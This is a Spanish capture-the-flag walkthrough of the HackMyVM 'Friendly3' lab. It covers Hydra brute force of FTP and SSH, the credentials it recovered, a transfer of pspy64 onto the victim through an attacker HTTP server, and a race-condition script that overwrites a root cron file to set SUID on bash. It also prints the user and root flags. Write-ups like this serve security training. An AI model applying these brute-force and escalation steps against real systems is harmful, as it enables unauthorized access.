# 🎯 Friendly3 - HackMyVM (Easy)

## 📋 Info

| Campo | Detalle |
|---|---|
| Máquina | Friendly3 |
| Plataforma | HackMyVM |
| Dificultad | Easy |
| OS | Linux Debian |
| IP | 192.168.0.10 (variable) |

---

## 🔍 Reconocimiento

```bash
sudo arp-scan -l
sudo nmap -p- --min-rate 5000 -n -Pn 192.168.0.10
```

**Puertos abiertos:**
- 21/tcp → FTP (vsftpd 3.0.3)
- 22/tcp → SSH
- 80/tcp → HTTP (nginx)

---

## 🌐 Enumeración Web

```bash
curl -s http://192.168.0.10
```

**Respuesta:**
```
Hi, sysadmin
I want you to know that I've just uploaded the new files into the FTP Server.
See you,
juan.
```

Pista clave: el usuario **juan** subió archivos al FTP.

---

## 📁 FTP — Credenciales con Hydra

FTP anónimo no funciona. Brute force con hydra:

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.10 -t 4
```

**Credenciales FTP:** `juan:alexis`

```bash
ftp 192.168.0.10
# usuario: juan
# password: alexis
```

Dentro del FTP encontramos 100 archivos vacíos y dos con contenido:
- `file80` → texto sin relevancia
- `fole32` → pista (contenido irrelevante)

---

## 🔑 Acceso SSH como juan

```bash
ssh juan@192.168.0.10
# password: alexis
```

**Flag user:**
```bash
cat ~/user.txt
# cb40b159c8086733d57280de3f97de30
```

Enumeración básica:
```bash
id          # uid=1001(juan)
sudo -l     # sudo not found
find / -perm -4000 2>/dev/null  # nada útil
cat /etc/passwd | grep -v nologin  # usuarios: juan, blue
```

---

## 🔑 Usuario blue — Hydra SSH

```bash
hydra -l blue -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.10 -t 4 -I
```

**Credenciales SSH:** `blue:cookie`

---

## 🔍 Monitorización de Procesos — pspy64

Desde Kali descargamos pspy64:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -P /tmp/
python3 -m http.server 8000 -d /tmp/
```

Desde la víctima como juan:

```bash
curl http://192.168.0.25:8000/pspy64 -o /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

**Proceso cron detectado (UID=0 → root):**
```
CMD: UID=0 | /bin/bash /opt/check_for_install.sh
CMD: UID=0 | chmod +w /tmp/a.bash
CMD: UID=0 | /bin/bash /tmp/a.bash
```

Root ejecuta cada minuto `/opt/check_for_install.sh` que da permisos de escritura a `/tmp/a.bash` y luego lo ejecuta.

---

## 💥 Escalada — Race Condition

**Ventana de ataque:** Entre `chmod +w /tmp/a.bash` y `/bin/bash /tmp/a.bash` podemos reescribir el archivo.

Creamos el exploit como juan:

```bash
cd /tmp
cat > exploit.sh << 'EOF'
#!/bin/bash
while true
do
    echo "chmod +s /bin/bash" > /tmp/a.bash
done
EOF
chmod +x exploit.sh
./exploit.sh
```

Dejamos el exploit corriendo. Cuando root ejecute el cron leerá nuestra versión e instalará SUID en bash.

---

## 🔴 Root

Verificamos el SUID de bash:

```bash
ls -la /bin/bash
# -rwsr-sr-x 1 root root 1265648 Apr 23 2023 /bin/bash
```

Con el bit SUID activado:

```bash
bash -p
whoami
# root
cat /root/root.txt
# eb9748b67f25e6bd202e5fa25f534d51
```

---

## 🗺️ Cadena de Ataque

1. **nginx** → mensaje de juan → pista usuario FTP
2. **hydra FTP** → `juan:alexis`
3. **SSH juan** → flag user `cb40b159c8086733d57280de3f97de30`
4. **hydra SSH** → `blue:cookie`
5. **pspy64** → cron root ejecuta `/tmp/a.bash`
6. **Race Condition** → exploit.sh sobreescribe `/tmp/a.bash`
7. **SUID bash** → `bash -p` → ROOT
8. **Flag root** → `eb9748b67f25e6bd202e5fa25f534d51`

---

## 📚 Técnicas Aprendidas

- **Hydra FTP/SSH** — brute force de credenciales
- **pspy64** — monitorización de procesos sin root
- **Race Condition** — ventana entre chmod y ejecución de script
- **SUID bash** — `bash -p` para shell con permisos de propietario
